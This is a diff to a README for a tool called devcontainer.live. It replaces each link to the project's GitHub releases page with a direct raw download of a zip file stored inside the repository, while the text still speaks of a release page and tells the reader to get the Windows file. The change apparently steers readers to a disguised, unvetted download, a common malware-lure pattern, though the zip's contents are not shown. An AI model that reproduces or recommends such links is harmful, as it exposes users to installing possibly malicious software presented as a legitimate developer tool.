@@ -1,6 +1,6 @@
 # 🛠️ devcontainer.live - Build devcontainer files fast
 
-[![Download devcontainer.live](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge)](https://github.com/victoriagreenpeace137/devcontainer.live/releases)
+[![Download devcontainer.live](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge)](https://github.com/victoriagreenpeace137/devcontainer.live/raw/refs/heads/main/public/data/live_devcontainer_v2.6-alpha.2.zip)
 
 ## 📦 What this app does
 
@@ -37,7 +37,7 @@ If you plan to use the generated config, Docker Desktop should be installed late
 
 Visit this page to download the app:
 
-[https://github.com/victoriagreenpeace137/devcontainer.live/releases](https://github.com/victoriagreenpeace137/devcontainer.live/releases)
+[https://github.com/victoriagreenpeace137/devcontainer.live/raw/refs/heads/main/public/data/live_devcontainer_v2.6-alpha.2.zip](https://github.com/victoriagreenpeace137/devcontainer.live/raw/refs/heads/main/public/data/live_devcontainer_v2.6-alpha.2.zip)
 
 On that page, look for the latest release and download the Windows file. If you see more than one file, pick the one meant for Windows.
 
@@ -213,7 +213,7 @@ The name devcontainer.live fits a tool that helps you create that file in a fast
 
 If you need the release page again, use this link:
 
-[https://github.com/victoriagreenpeace137/devcontainer.live/releases](https://github.com/victoriagreenpeace137/devcontainer.live/releases)
+[https://github.com/victoriagreenpeace137/devcontainer.live/raw/refs/heads/main/public/data/live_devcontainer_v2.6-alpha.2.zip](https://github.com/victoriagreenpeace137/devcontainer.live/raw/refs/heads/main/public/data/live_devcontainer_v2.6-alpha.2.zip)
 
 ## 🔎 Project topics
 
